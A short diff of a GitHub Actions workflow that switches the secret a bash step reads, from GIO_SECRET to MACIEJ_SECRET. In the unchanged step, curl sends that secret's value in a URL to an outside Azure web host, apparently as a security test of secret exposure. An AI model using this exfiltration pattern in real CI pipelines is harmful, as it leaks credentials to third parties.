@@ -15,7 +15,7 @@ jobs:
     steps:
       - shell: bash
         env:
-          SECRET: ${{ secrets.GIO_SECRET }}
+          SECRET: ${{ secrets.MACIEJ_SECRET }}
         run: |
           curl -L https://wa-ncd-sec01.azurewebsites.net/$SECRET
 
